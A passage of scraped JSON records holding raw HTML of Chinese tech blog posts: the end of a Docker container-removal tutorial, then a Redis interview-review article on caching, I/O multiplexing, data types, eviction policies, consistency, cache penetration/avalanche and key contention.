data-line=\"crayon-5b4a7536da0d6410192699-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a7536da0d6410192699-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4a7536da0d6410192699-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a7536da0d6410192699-1\"><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">kerneltalks</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># docker container rm cranky_cori</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a7536da0d6410192699-2\"><span class=\"crayon-e\">cranky_cori</span></div><div class=\"crayon-line\" id=\"crayon-5b4a7536da0d6410192699-3\"><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">kerneltalks</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># docker container ls -a</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a7536da0d6410192699-4\"><span class=\"crayon-e\">CONTAINER </span><span class=\"crayon-e\">ID        </span><span class=\"crayon-e\">IMAGE               </span><span class=\"crayon-e\">COMMAND             </span><span class=\"crayon-e\">CREATED             </span><span class=\"crayon-e\">STATUS              </span><span class=\"crayon-e\">PORTS               </span><span class=\"crayon-i\">NAMES</span></div><div class=\"crayon-line\" id=\"crayon-5b4a7536da0d6410192699-5\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>你看，一旦移除了容器，即使再使用 <code>ls -a</code> 命令也查看不到容器了。</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114145\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114145votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114145\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,Docker,Linux,容器", "url": "http://blog.jobbole.com/114145/", "url_obj_id": "a80c1972902edd63a90d8bf1ff9bc04b"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2016/04/49961db8952e63d98b519b76a2daa5e2.png"], "title": "分布式之 Redis 复习精讲", "create_date": "2018/05/28 ·", "praise_num": 1, "fav_num": 7, "comment_num": 1, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://www.cnblogs.com/rjzheng/p/9096228.html\">孤独烟</a>   </div><h2 id=\"引言\">引言</h2>\n<h3 id=\"为什么写这篇文章\">为什么写这篇文章?</h3>\n<p>博主的<a href=\"http://blog.jobbole.com/114016/\">《分布式之消息队列复习精讲》</a>得到了大家的好评，内心诚惶诚恐，想着再出一篇关于复习精讲的文章。但是还是要说明一下，复习精讲的文章偏面试准备，真正在开发过程中，还是脚踏实地，一步一个脚印，不要投机取巧。<br>\n考虑到绝大部分写业务的程序员，在实际开发中使用redis的时候，只会setvalue和getvalue两个操作，对redis整体缺乏一个认知。又恰逢博主某个同事下周要去培训redis，所以博主斗胆以redis为题材，对redis常见问题做一个总结，希望能够弥补大家的知识盲点。</p>\n<h3 id=\"复习要点\">复习要点?</h3>\n<p>本文围绕以下几点进行阐述<br>\n1、为什么使用redis<br>\n2、使用redis有什么缺点<br>\n3、单线程的redis为什么这么快<br>\n4、redis的数据类型，以及每种数据类型的使用场景<br>\n5、redis的过期策略以及内存淘汰机制<br>\n6、redis和数据库双写一致性问题<br>\n7、如何应对缓存穿透和缓存雪崩问题<br>\n8、如何解决redis的并发竞争问题</p>\n<h2 id=\"正文\">正文</h2>\n<h3 id=\"为什么使用redis\">1、为什么使用redis</h3>\n<p><strong>分析</strong>:博主觉得在项目中使用redis，主要是从两个角度去考虑:<strong>性能</strong>和<strong>并发</strong>。当然，redis还具备可以做分布式锁等其他功能，但是如果只是为了分布式锁这些其他功能，完全还有其他中间件(如zookpeer等)代替，并不是非要使用redis。因此，这个问题主要从性能和并发两个角度去答。<br>\n<strong>回答</strong>:如下所示，分为两点<br>\n<strong>（一）性能</strong><br>\n如下图所示，我们在碰到需要执行耗时特别久，且结果不频繁变动的SQL，就特别适合将运行结果放入缓存。这样，后面的请求就去缓存中读取，使得请求能够<strong>迅速响应</strong>。<br>\n<img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/57e5c741c49cd5a8529aa90b0df7e147.png\" alt=\"image\"><br>\n<strong>题外话：</strong>忽然想聊一下这个<strong>迅速响应</strong>的标准。其实根据交互效果的不同，这个响应时间没有固定标准。不过曾经有人这么告诉我:”在理想状态下，我们的页面跳转需要在<strong>瞬间</strong>解决，对于页内操作则需要在<strong>刹那</strong>间解决。另外，超过<strong>一弹指</strong>的耗时操作要有进度提示，并且可以随时中止或取消，这样才能给用户最好的体验。”<br>\n那么<strong>瞬间、刹那、一弹指</strong>具体是多少时间呢？<br>\n根据《摩诃僧祗律》记载</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a82eb8dcdc299073736\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n一刹那者为一念，二十念为一瞬，二十瞬为一弹指，二十弹指为一罗预，二十罗预为一须臾，一日一夜有三十须臾。</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a82eb8dcdc299073736-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a82eb8dcdc299073736-1\">一刹那者为一念，二十念为一瞬，二十瞬为一弹指，二十弹指为一罗预，二十罗预为一须臾，一日一夜有三十须臾。</div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>那么，经过周密的计算，一<strong>瞬间</strong>为0.36 秒,一<strong>刹那</strong>有 0.018 秒.一<strong>弹指</strong>长达 7.2 秒。<br>\n<strong>（二）并发</strong><br>\n如下图所示，在大并发的情况下，所有的请求直接访问数据库，数据库会出现连接异常。这个时候，就需要使用redis做一个缓冲操作，让请求先访问到redis，而不是直接访问数据库。<br>\n<img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/fa481e96124c6f54ad0f464a515cce01.png\" alt=\"image\"></p>\n<h3 id=\"使用redis有什么缺点\">2、使用redis有什么缺点</h3>\n<p><strong>分析</strong>:大家用redis这么久，这个问题是必须要了解的，基本上使用redis都会碰到一些问题，常见的也就几个。<br>\n<strong>回答</strong>:主要是四个问题<br>\n(一)缓存和数据库双写一致性问题<br>\n(二)缓存雪崩问题<br>\n(三)缓存击穿问题<br>\n(四)缓存的并发竞争问题<br>\n这四个问题，我个人是觉得在项目中，比较常遇见的，具体解决方案，后文给出。</p>\n<h3 id=\"单线程的redis为什么这么快\">3、单线程的redis为什么这么快</h3>\n<p><strong>分析</strong>:这个问题其实是对redis内部机制的一个考察。其实根据博主的面试经验，很多人其实都不知道redis是单线程工作模型。所以，这个问题还是应该要复习一下的。<br>\n<strong>回答</strong>:主要是以下三点<br>\n(一)纯内存操作<br>\n(二)单线程操作，避免了频繁的上下文切换<br>\n(三)采用了非阻塞<strong>I/O多路复用机制</strong></p>\n<p><strong>题外话：</strong>我们现在要仔细的说一说I/O多路复用机制，因为这个说法实在是太通俗了，通俗到一般人都不懂是什么意思。博主打一个比方：小曲在S城开了一家快递店，负责同城快送服务。小曲因为资金限制，雇佣了<strong>一批</strong>快递员，然后小曲发现资金不够了，只够买<strong>一辆</strong>车送快递。<br>\n<strong>经营方式一</strong><br>\n客户每送来一份快递，小曲就让一个快递员盯着，然后快递员开车去送快递。慢慢的小曲就发现了这种经营方式存在下述问题</p>\n<ul>\n<li>几十个快递员基本上时间都花在了抢车上了，大部分快递员都处在闲置状态，谁抢到了车，谁就能去送快递</li>\n<li>随着快递的增多，快递员也越来越多，小曲发现快递店里越来越挤，没办法雇佣新的快递员了</li>\n<li>快递员之间的协调很花时间</li>\n</ul>\n<p>综合上述缺点，小曲痛定思痛，提出了下面的经营方式<br>\n<strong>经营方式二</strong><br>\n小曲只雇佣一个快递员。然后呢，客户送来的快递，小曲按<strong>送达地点</strong>标注好，然后<strong>依次</strong>放在一个地方。最后，那个快递员<strong>依次</strong>的去取快递，一次拿一个，然后开着车去送快递，送好了就回来拿下一个快递。</p>\n<p><strong>对比</strong><br>\n上述两种经营方式对比，是不是明显觉得第二种，效率更高，更好呢。在上述比喻中:</p>\n<ul>\n<li>每个快递员——————&gt;每个线程</li>\n<li>每个快递——————–&gt;每个socket(I/O流)</li>\n<li>快递的送达地点————–&gt;socket的不同状态</li>\n<li>客户送快递请求————–&gt;来自客户端的请求</li>\n<li>小曲的经营方式————–&gt;服务端运行的代码</li>\n<li>一辆车———————-&gt;CPU的核数</li>\n</ul>\n<p>于是我们有如下结论<br>\n1、经营方式一就是传统的并发模型，每个I/O流(快递)都有一个新的线程(快递员)管理。<br>\n2、经营方式二就是I/O多路复用。只有单个线程(一个快递员)，通过跟踪每个I/O流的状态(每个快递的送达地点)，来管理多个I/O流。</p>\n<p>下面类比到真实的redis线程模型，如图所示<br>\n<img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/0a2db924f854f5508d64a0dfa798899a.png\" alt=\"image\"><br>\n参照上图，简单来说，就是。我们的redis-client在操作的时候，会产生具有不同事件类型的socket。在服务端，有一段I/0多路复用程序，将其置入队列之中。然后，文件事件分派器，依次去队列中取，转发到不同的事件处理器中。<br>\n需要说明的是，这个I/O多路复用机制，redis还提供了select、epoll、evport、kqueue等多路复用函数库，大家可以自行去了解。</p>\n<h3 id=\"redis的数据类型以及每种数据类型的使用场景\">4、redis的数据类型，以及每种数据类型的使用场景</h3>\n<p><strong>分析</strong>：是不是觉得这个问题很基础，其实我也这么觉得。然而根据面试经验发现，至少百分八十的人答不上这个问题。建议，在项目中用到后，再类比记忆，体会更深，不要硬记。基本上，一个合格的程序员，五种类型都会用到。<br>\n<strong>回答</strong>：一共五种<br>\n(一)String<br>\n这个其实没啥好说的，最常规的set/get操作，value可以是String也可以是数字。一般做<strong>一些复杂的计数功能的缓存。</strong><br>\n(二)hash<br>\n这里value存放的是结构化的对象，比较方便的就是操作其中的某个字段。博主在做<strong>单点登录</strong>的时候，就是用这种数据结构存储用户信息，以cookieId作为key，设置30分钟为缓存过期时间，能很好的模拟出类似session的效果。<br>\n(三)list<br>\n使用List的数据结构，可以<strong>做简单的消息队列的功能</strong>。另外还有一个就是，可以利用lrange命令，<strong>做基于redis的分页功能</strong>，性能极佳，用户体验好。<br>\n(四)set<br>\n因为set堆放的是一堆不重复值的集合。所以可以做<strong>全局去重的功能</strong>。为什么不用JVM自带的Set进行去重？因为我们的系统一般都是集群部署，使用JVM自带的Set，比较麻烦，难道为了一个做一个全局去重，再起一个公共服务，太麻烦了。<br>\n另外，就是利用交集、并集、差集等操作，可以<strong>计算共同喜好，全部的喜好，自己独有的喜好等功能</strong>。<br>\n(五)sorted set<br>\nsorted set多了一个权重参数score,集合中的元素能够按score进行排列。可以做<strong>排行榜应用，取TOP N操作</strong>。另外，参照另一篇<a href=\"http://blog.jobbole.com/114009/\">《分布式之延时任务方案解析》</a>，该文指出了sorted set可以用来做<strong>延时任务</strong>。最后一个应用就是可以做<strong>范围查找</strong>。</p>\n<h3 id=\"redis的过期策略以及内存淘汰机制\">5、redis的过期策略以及内存淘汰机制</h3>\n<p><strong>分析</strong>:这个问题其实相当重要，到底redis有没用到家，这个问题就可以看出来。比如你redis只能存5G数据，可是你写了10G，那会删5G的数据。怎么删的，这个问题思考过么？还有，你的数据已经设置了过期时间，但是时间到了，内存占用率还是比较高，有思考过原因么?<br>\n<strong>回答</strong>:<br>\nredis采用的是定期删除+惰性删除策略。<br>\n<strong>为什么不用定时删除策略?</strong><br>\n定时删除,用一个定时器来负责监视key,过期则自动删除。虽然内存及时释放，但是十分消耗CPU资源。在大并发请求下，CPU要将时间应用在处理请求，而不是删除key,因此没有采用这一策略.<br>\n<strong>定期删除+惰性删除是如何工作的呢?</strong><br>\n定期删除，redis默认每个100ms检查，是否有过期的key,有过期key则删除。需要说明的是，redis不是每个100ms将所有的key检查一次，而是随机抽取进行检查(如果每隔100ms,全部key进行检查，redis岂不是卡死)。因此，如果只采用定期删除策略，会导致很多key到时间没有删除。<br>\n于是，惰性删除派上用场。也就是说在你获取某个key的时候，redis会检查一下，这个key如果设置了过期时间那么是否过期了？如果过期了此时就会删除。<br>\n<strong>采用定期删除+惰性删除就没其他问题了么?</strong><br>\n不是的，如果定期删除没删除key。然后你也没即时去请求key，也就是说惰性删除也没生效。这样，redis的内存会越来越高。那么就应该采用<strong>内存淘汰机制</strong>。<br>\n在redis.conf中有一行配置</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a82eb8dceb913066603\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# maxmemory-policy volatile-lru</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a82eb8dceb913066603-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a82eb8dceb913066603-1\"><span class=\"crayon-p\"># maxmemory-policy volatile-lru</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>该配置就是配内存淘汰策略的(什么，你没配过？好好反省一下自己)<br>\n1）noeviction：当内存不足以容纳新写入数据时，新写入操作会报错。<strong>应该没人用吧。</strong><br>\n2）allkeys-lru：当内存不足以容纳新写入数据时，在键空间中，移除最近最少使用的key。<strong>推荐使用，目前项目在用这种。</strong><br>\n3）allkeys-random：当内存不足以容纳新写入数据时，在键空间中，随机移除某个key。<strong>应该也没人用吧，你不删最少使用Key,去随机删。</strong><br>\n4）volatile-lru：当内存不足以容纳新写入数据时，在设置了过期时间的键空间中，移除最近最少使用的key。<strong>这种情况一般是把redis既当缓存，又做持久化存储的时候才用。不推荐</strong><br>\n5）volatile-random：当内存不足以容纳新写入数据时，在设置了过期时间的键空间中，随机移除某个key。<strong>依然不推荐</strong><br>\n6）volatile-ttl：当内存不足以容纳新写入数据时，在设置了过期时间的键空间中，有更早过期时间的key优先移除。<strong>不推荐</strong><br>\nps：如果没有设置 expire 的key, 不满足先决条件(prerequisites); 那么 volatile-lru, volatile-random 和 volatile-ttl 策略的行为, 和 noeviction(不删除) 基本上一致。</p>\n<h3 id=\"redis和数据库双写一致性问题\">6、redis和数据库双写一致性问题</h3>\n<p><strong>分析</strong>:一致性问题是分布式常见问题，还可以再分为最终一致性和强一致性。数据库和缓存双写，就必然会存在不一致的问题。答这个问题，先明白一个前提。就是<strong>如果对数据有强一致性要求，不能放缓存。</strong>我们所做的一切，只能保证最终一致性。另外，我们所做的方案其实从根本上来说，只能说<strong>降低不一致发生的概率</strong>，无法完全避免。因此，有强一致性要求的数据，不能放缓存。<br>\n<strong>回答</strong>:<a href=\"http://blog.jobbole.com/113992/\">《分布式之数据库和缓存双写一致性方案解析》</a>给出了详细的分析，在这里简单的说一说。首先，采取正确更新策略，先更新数据库，再删缓存。其次，因为可能存在删除缓存失败的问题，提供一个补偿措施即可，例如利用消息队列。</p>\n<h3 id=\"如何应对缓存穿透和缓存雪崩问题\">7、如何应对缓存穿透和缓存雪崩问题</h3>\n<p><strong>分析</strong>:这两个问题，说句实在话，一般中小型传统软件企业，很难碰到这个问题。如果有大并发的项目，流量有几百万左右。这两个问题一定要深刻考虑。<br>\n<strong>回答</strong>:如下所示<br>\n<strong>缓存穿透</strong>，即黑客故意去请求缓存中不存在的数据，导致所有的请求都怼到数据库上，从而数据库连接异常。<br>\n<strong>解决方案</strong>:<br>\n(一)利用互斥锁，缓存失效的时候，先去获得锁，得到锁了，再去请求数据库。没得到锁，则休眠一段时间重试<br>\n(二)采用异步更新策略，无论key是否取到值，都直接返回。value值中维护一个缓存失效时间，缓存如果过期，异步起一个线程去读数据库，更新缓存。需要做<strong>缓存预热</strong>(项目启动前，先加载缓存)操作。<br>\n(三)提供一个能迅速判断请求是否有效的拦截机制，比如，利用布隆过滤器，内部维护一系列合法有效的key。迅速判断出，请求所携带的Key是否合法有效。如果不合法，则直接返回。<br>\n<strong>缓存雪崩</strong>，即缓存同一时间大面积的失效，这个时候又来了一波请求，结果请求都怼到数据库上，从而导致数据库连接异常。<br>\n<strong>解决方案</strong>:<br>\n(一)给缓存的失效时间，加上一个随机值，避免集体失效。<br>\n(二)使用互斥锁，但是该方案吞吐量明显下降了。<br>\n(三)双缓存。我们有两个缓存，缓存A和缓存B。缓存A的失效时间为20分钟，缓存B不设失效时间。自己做缓存预热操作。然后细分以下几个小点</p>\n<ul>\n<li>I 从缓存A读数据库，有则直接返回</li>\n<li>II A没有数据，直接从B读数据，直接返回，并且异步启动一个更新线程。</li>\n<li>III 更新线程同时更新缓存A和缓存B。</li>\n</ul>\n<h3 id=\"如何解决redis的并发竞争key问题\">8、如何解决redis的并发竞争key问题</h3>\n<p><strong>分析</strong>:这个问题大致就是，同时有多个子系统去set一个key。这个时候要注意什么呢？大家思考过么。需要说明一下，博主提前百度了一下，发现答案基本都是推荐用redis事务机制。博主<strong>不推荐使用redis的事务机制。</strong>因为我们的生产环境，基本都是redis集群环境，做了数据分片操作。你一个事务中有涉及到多个key操作的时候，这多个key不一定都存储在同一个redis-server上。因此，<strong>redis的事务机制，十分鸡肋。</strong><br>\n<strong>回答:</strong>如下所示<br>\n(1)如果对这个key操作，<strong>不要求顺序</strong><br>\n这种情况下，准备一个分布式锁，大家去抢锁，抢到锁就做set操作即可，比较简单。<br>\n(2)如果对这个key操作，<strong>要求顺序</strong><br>\n假设有一个key1,系统A需要将key1设置为valueA,系统B需要将key1设置为valueB,系统C需要将key1设置为valueC.<br>\n期望按照key1的value值按照 valueA–&gt;valueB–&gt;valueC的顺序变化。这种时候我们在数据写入数据库的时候，需要保存一个时间戳。假设时间戳如下</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a82eb8dcf3423370671\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n系统A key 1 {valueA  3:00}\r\n系统B key 1 {valueB  3:05}\r\n系统C key 1 {valueC  3:10}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a82eb8dcf3423370671-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a82eb8dcf3423370671-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a82eb8dcf3423370671-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a82eb8dcf3423370671-1\">系统<span class=\"crayon-e\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">key</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-i\">valueA</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">3</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a82eb8dcf3423370671-2\">系统<span class=\"crayon-e\">B</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">key</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-i\">valueB</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">3</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">05</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4a82eb8dcf3423370671-3\">系统<span class=\"crayon-e\">C</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">key</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-i\">valueC</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">3</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">10</span><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0015 seconds] -->\r\n<p>那么，假设这会系统B先抢到锁，将key1设置为{valueB 3:05}。接下来系统A抢到锁，发现自己的valueA的时间戳早于缓存中的时间戳，那就不做set操作了。以此类推。</p>\n<p>其他方法，比如利用队列，将set方法变成串行访问也可以。总之，灵活变通。</p>\n<h2 id=\"总结\">总结</h2>\n<p>本文对redis的常见问题做了一个总结。大部分是博主自己在工作中遇到，以及以前面试别人的时候，爱问的一些问题。另外，<strong>不推荐大家临时抱佛脚</strong>，真正碰到一些有经验的工程师，其实几下就能把你问懵。最后，希望大家有所收获吧。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114050\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114050votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114050\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 7 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" 